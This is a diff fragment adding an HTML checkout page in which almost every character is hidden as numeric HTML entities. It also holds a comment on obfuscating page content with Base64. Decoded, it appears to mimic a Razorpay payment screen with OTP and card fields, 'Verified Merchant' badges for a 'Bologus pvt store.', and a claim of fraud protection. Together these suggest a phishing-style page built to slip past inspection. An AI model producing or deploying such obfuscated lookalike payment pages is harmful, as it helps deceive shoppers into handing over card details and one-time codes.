+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#105;&#108;&#116;&#101;&#114;&#58;&#32;&#98;&#108;&#117;&#114;&#40;&#49;&#112;&#120;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#104;&#105;&#100;&#100;&#101;&#110;&#32;&#123;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#110;&#111;&#110;&#101;&#32;&#33;&#105;&#109;&#112;&#111;&#114;&#116;&#97;&#110;&#116;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#99;&#111;&#110;&#116;&#97;&#105;&#110;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#105;&#110;&#112;&#117;&#116;&#45;&#119;&#114;&#97;&#112;&#112;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#53;&#48;&#37;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#45;&#114;&#105;&#103;&#104;&#116;&#58;&#32;&#52;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#98;&#117;&#116;&#116;&#111;&#110;&#45;&#119;&#114;&#97;&#112;&#112;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#53;&#48;&#37;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#45;&#108;&#101;&#102;&#116;&#58;&#32;&#52;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#97;&#114;&#100;&#45;&#105;&#99;&#111;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#50;&#52;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#97;&#117;&#116;&#111;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#98;&#108;&#111;&#99;&#107;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#58;&#32;&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#114;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#50;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#111;&#112;&#58;&#32;&#53;&#48;&#37;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#108;&#97;&#116;&#101;&#89;&#40;&#45;&#53;&#48;&#37;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#35;&#99;&#97;&#114;&#100;&#84;&#121;&#112;&#101;&#73;&#99;&#111;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#58;&#32;&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#114;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#50;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#111;&#112;&#58;&#32;&#53;&#48;&#37;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#108;&#97;&#116;&#101;&#89;&#40;&#45;&#53;&#48;&#37;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#108;&#105;&#103;&#110;&#45;&#105;&#116;&#101;&#109;&#115;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#106;&#117;&#115;&#116;&#105;&#102;&#121;&#45;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#50;&#52;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#51;&#56;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#101;&#114;&#114;&#111;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#101;&#102;&#52;&#52;&#52;&#52;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#32;&#49;&#51;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#97;&#114;&#103;&#105;&#110;&#58;&#32;&#52;&#112;&#120;&#32;&#48;&#32;&#56;&#112;&#120;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#101;&#120;&#116;&#45;&#97;&#108;&#105;&#103;&#110;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#110;&#111;&#110;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;</style>&#13;
+&#32;&#32;<!--
+    NOTE ON OBFUSCATION:
+    It is impossible to completely encrypt HTML sent to the client.
+    The best you can do is obfuscate it.
+    For example, you can encode your HTML into Base64 and decode it with JavaScript.
+    This example is provided for illustration and is commented out.
+    
+    <script>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#47;&#47;&#32;&#69;&#120;&#97;&#109;&#112;&#108;&#101;&#58;&#32;&#82;&#101;&#112;&#108;&#97;&#99;&#101;&#32;&#116;&#104;&#101;&#32;&#98;&#111;&#100;&#121;&#32;&#119;&#105;&#116;&#104;&#32;&#111;&#98;&#102;&#117;&#115;&#99;&#97;&#116;&#101;&#100;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#47;&#47;&#32;&#118;&#97;&#114;&#32;&#101;&#110;&#99;&#111;&#100;&#101;&#100;&#72;&#84;&#77;&#76;&#32;&#61;&#32;&#34;&#80;&#72;&#82;&#112;&#100;&#71;&#120;&#108;&#80;&#107;&#57;&#105;&#90;&#110;&#86;&#122;&#89;&#50;&#70;&#48;&#90;&#87;&#81;&#103;&#81;&#50;&#57;&#117;&#100;&#71;&#86;&#117;&#100;&#68;&#119;&#118;&#100;&#71;&#108;&#48;&#98;&#71;&#85;&#43;&#46;&#46;&#46;&#34;&#59;&#32;&#47;&#47;&#32;&#89;&#111;&#117;&#114;&#32;&#101;&#110;&#116;&#105;&#114;&#101;&#32;&#72;&#84;&#77;&#76;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#32;&#101;&#110;&#99;&#111;&#100;&#101;&#100;&#32;&#105;&#110;&#32;&#66;&#97;&#115;&#101;&#54;&#52;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#47;&#47;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#119;&#114;&#105;&#116;&#101;&#40;&#97;&#116;&#111;&#98;&#40;&#101;&#110;&#99;&#111;&#100;&#101;&#100;&#72;&#84;&#77;&#76;&#41;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;</script>&#13;
+&#32;&#32;&#45;&#45;&#62;&#13;
+</head>&#13;
+<body>&#13;
+&#32;&#32;<div class="&#112;&#97;&#103;&#101;&#45;&#99;&#111;&#110;&#116;&#97;&#105;&#110;&#101;&#114;" style="&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#108;&#105;&#110;&#101;&#97;&#114;&#45;&#103;&#114;&#97;&#100;&#105;&#101;&#110;&#116;&#40;&#52;&#53;&#100;&#101;&#103;&#44;&#32;&#35;&#102;&#102;&#48;&#48;&#48;&#48;&#32;&#53;&#48;&#37;&#44;&#32;&#35;&#102;&#102;&#102;&#102;&#102;&#102;&#32;&#53;&#48;&#37;&#41;&#59;">&#13;
+&#32;&#32;&#32;&#32;<div class="&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#45;&#119;&#114;&#97;&#112;&#112;&#101;&#114;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#109;&#97;&#120;&#45;&#119;&#45;&#52;&#120;&#108;&#32;&#109;&#120;&#45;&#97;&#117;&#116;&#111;&#32;&#98;&#103;&#45;&#119;&#104;&#105;&#116;&#101;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#50;&#120;&#108;&#32;&#115;&#104;&#97;&#100;&#111;&#119;&#45;&#108;&#103;&#32;&#111;&#118;&#101;&#114;&#102;&#108;&#111;&#119;&#45;&#104;&#105;&#100;&#100;&#101;&#110;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#102;&#108;&#101;&#120;&#32;&#102;&#108;&#101;&#120;&#45;&#99;&#111;&#108;&#32;&#109;&#100;&#58;&#102;&#108;&#101;&#120;&#45;&#114;&#111;&#119;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#109;&#100;&#58;&#119;&#45;&#55;&#47;&#49;&#50;&#32;&#112;&#45;&#53;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#98;&#103;&#45;&#119;&#104;&#105;&#116;&#101;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#50;&#120;&#108;&#32;&#115;&#104;&#97;&#100;&#111;&#119;&#45;&#115;&#109;&#32;&#109;&#98;&#45;&#54;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#102;&#108;&#101;&#120;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#115;&#116;&#97;&#114;&#116;&#32;&#103;&#97;&#112;&#45;&#52;&#32;&#109;&#98;&#45;&#52;&#32;&#112;&#120;&#45;&#52;&#32;&#112;&#116;&#45;&#52;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#119;&#45;&#49;&#50;&#32;&#104;&#45;&#49;&#50;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;&#32;&#111;&#118;&#101;&#114;&#102;&#108;&#111;&#119;&#45;&#104;&#105;&#100;&#100;&#101;&#110;&#32;&#102;&#108;&#101;&#120;&#45;&#115;&#104;&#114;&#105;&#110;&#107;&#45;&#48;&#32;&#98;&#103;&#45;&#103;&#114;&#97;&#121;&#45;&#53;&#48;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#105;&#109;&#97;&#103;&#101;&#115;&#46;&#117;&#110;&#115;&#112;&#108;&#97;&#115;&#104;&#46;&#99;&#111;&#109;&#47;&#112;&#104;&#111;&#116;&#111;&#45;&#49;&#53;&#55;&#50;&#48;&#53;&#57;&#48;&#48;&#50;&#48;&#53;&#51;&#45;&#56;&#99;&#99;&#53;&#97;&#100;&#50;&#102;&#52;&#97;&#51;&#56;&#63;&#119;&#61;&#54;&#52;&#38;&#104;&#61;&#54;&#52;&#38;&#102;&#105;&#116;&#61;&#99;&#114;&#111;&#112;" alt="&#77;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#32;&#76;&#111;&#103;&#111;" class="&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#104;&#45;&#102;&#117;&#108;&#108;&#32;&#111;&#98;&#106;&#101;&#99;&#116;&#45;&#99;&#111;&#118;&#101;&#114;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#102;&#108;&#101;&#120;&#32;&#102;&#108;&#101;&#120;&#45;&#99;&#111;&#108;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#116;&#101;&#120;&#116;&#45;&#50;&#120;&#108;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#101;&#109;&#105;&#98;&#111;&#108;&#100;">&#66;&#111;&#108;&#111;&#103;&#117;&#115;&#32;&#112;&#118;&#116;&#32;&#115;&#116;&#111;&#114;&#101;&#46;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#109;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#45;&#98;&#97;&#100;&#103;&#101;&#32;&#109;&#116;&#45;&#49;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#102;&#108;&#101;&#120;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#103;&#97;&#112;&#45;&#49;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#54;&#48;&#48;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg class="&#119;&#45;&#52;&#32;&#104;&#45;&#52;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#101;&#101;&#110;&#45;&#53;&#48;&#48;&#32;&#115;&#104;&#105;&#101;&#108;&#100;&#45;&#105;&#99;&#111;&#110;" viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#57;&#32;&#49;&#50;&#108;&#50;&#32;&#50;&#32;&#52;&#45;&#52;&#109;&#53;&#46;&#54;&#49;&#56;&#45;&#52;&#46;&#48;&#49;&#54;&#65;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#48;&#32;&#48;&#49;&#49;&#50;&#32;&#50;&#46;&#57;&#52;&#52;&#97;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#48;&#32;&#48;&#49;&#45;&#56;&#46;&#54;&#49;&#56;&#32;&#51;&#46;&#48;&#52;&#65;&#49;&#50;&#46;&#48;&#50;&#32;&#49;&#50;&#46;&#48;&#50;&#32;&#48;&#32;&#48;&#48;&#51;&#32;&#57;&#99;&#48;&#32;&#53;&#46;&#53;&#57;&#49;&#32;&#51;&#46;&#56;&#50;&#52;&#32;&#49;&#48;&#46;&#50;&#57;&#32;&#57;&#32;&#49;&#49;&#46;&#54;&#50;&#50;&#32;&#53;&#46;&#49;&#55;&#54;&#45;&#49;&#46;&#51;&#51;&#50;&#32;&#57;&#45;&#54;&#46;&#48;&#51;&#32;&#57;&#45;&#49;&#49;&#46;&#54;&#50;&#50;&#32;&#48;&#45;&#49;&#46;&#48;&#52;&#50;&#45;&#46;&#49;&#51;&#51;&#45;&#50;&#46;&#48;&#53;&#50;&#45;&#46;&#51;&#56;&#50;&#45;&#51;&#46;&#48;&#49;&#54;&#122;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span>&#86;&#101;&#114;&#105;&#102;&#105;&#101;&#100;&#32;&#77;&#101;&#114;&#99;&#104;&#97;&#110;&#116;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#109;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#45;&#100;&#114;&#111;&#112;&#100;&#111;&#119;&#110;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#116;&#114;&#117;&#115;&#116;&#101;&#100;&#45;&#115;&#104;&#105;&#101;&#108;&#100;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg class="&#119;&#45;&#49;&#50;&#32;&#104;&#45;&#49;&#50;&#32;&#116;&#101;&#120;&#116;&#45;&#119;&#104;&#105;&#116;&#101;&#32;&#115;&#104;&#105;&#101;&#108;&#100;&#45;&#105;&#99;&#111;&#110;" viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#57;&#32;&#49;&#50;&#108;&#50;&#32;&#50;&#32;&#52;&#45;&#52;&#109;&#53;&#46;&#54;&#49;&#56;&#45;&#52;&#46;&#48;&#49;&#54;&#65;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#48;&#32;&#48;&#49;&#49;&#50;&#32;&#50;&#46;&#57;&#52;&#52;&#97;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#48;&#32;&#48;&#49;&#45;&#56;&#46;&#54;&#49;&#56;&#32;&#51;&#46;&#48;&#52;&#65;&#49;&#50;&#46;&#48;&#50;&#32;&#49;&#50;&#46;&#48;&#50;&#32;&#48;&#32;&#48;&#48;&#51;&#32;&#57;&#99;&#48;&#32;&#53;&#46;&#53;&#57;&#49;&#32;&#51;&#46;&#56;&#50;&#52;&#32;&#49;&#48;&#46;&#50;&#57;&#32;&#57;&#32;&#49;&#49;&#46;&#54;&#50;&#50;&#32;&#53;&#46;&#49;&#55;&#54;&#45;&#49;&#46;&#51;&#51;&#50;&#32;&#57;&#45;&#54;&#46;&#48;&#51;&#32;&#57;&#45;&#49;&#49;&#46;&#54;&#50;&#50;&#32;&#48;&#45;&#49;&#46;&#48;&#52;&#50;&#45;&#46;&#49;&#51;&#51;&#45;&#50;&#46;&#48;&#53;&#50;&#45;&#46;&#51;&#56;&#50;&#45;&#51;&#46;&#48;&#49;&#54;&#122;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#102;&#108;&#101;&#120;&#32;&#102;&#108;&#101;&#120;&#45;&#99;&#111;&#108;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#116;&#101;&#120;&#116;&#45;&#108;&#103;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#101;&#109;&#105;&#98;&#111;&#108;&#100;&#32;&#116;&#101;&#120;&#116;&#45;&#119;&#104;&#105;&#116;&#101;">&#66;&#111;&#108;&#111;&#103;&#117;&#115;&#32;&#112;&#118;&#116;&#32;&#115;&#116;&#111;&#114;&#101;&#46;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#118;&#101;&#114;&#105;&#102;&#105;&#101;&#100;&#45;&#116;&#97;&#103;">&#86;&#101;&#114;&#105;&#102;&#105;&#101;&#100;&#32;&#77;&#101;&#114;&#99;&#104;&#97;&#110;&#116;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#115;&#112;&#97;&#99;&#101;&#45;&#121;&#45;&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#105;&#116;&#101;&#109;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg class="&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#116;&#105;&#99;&#107;" viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#53;&#32;&#49;&#51;&#108;&#52;&#32;&#52;&#76;&#49;&#57;&#32;&#55;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span>&#86;&#101;&#114;&#105;&#102;&#105;&#101;&#100;&#32;&#102;&#111;&#114;&#32;&#97;&#117;&#116;&#104;&#101;&#110;&#116;&#105;&#99;&#105;&#116;&#121;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#105;&#116;&#101;&#109;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg class="&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#116;&#105;&#99;&#107;" viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#53;&#32;&#49;&#51;&#108;&#52;&#32;&#52;&#76;&#49;&#57;&#32;&#55;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span>&#82;&#97;&#122;&#111;&#114;&#112;&#97;&#121;&#39;&#115;&#32;&#114;&#105;&#115;&#107;&#32;&#115;&#121;&#115;&#116;&#101;&#109;&#32;&#101;&#110;&#115;&#117;&#114;&#101;&#115;&#32;&#115;&#101;&#99;&#117;&#114;&#101;&#32;&#112;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#112;&#114;&#111;&#116;&#101;&#99;&#116;&#105;&#111;&#110;&#32;&#102;&#114;&#111;&#109;&#32;&#102;&#114;&#97;&#117;&#100;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#105;&#116;&#101;&#109;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg class="&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#116;&#105;&#99;&#107;" viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#53;&#32;&#49;&#51;&#108;&#52;&#32;&#52;&#76;&#49;&#57;&#32;&#55;" />&#13;
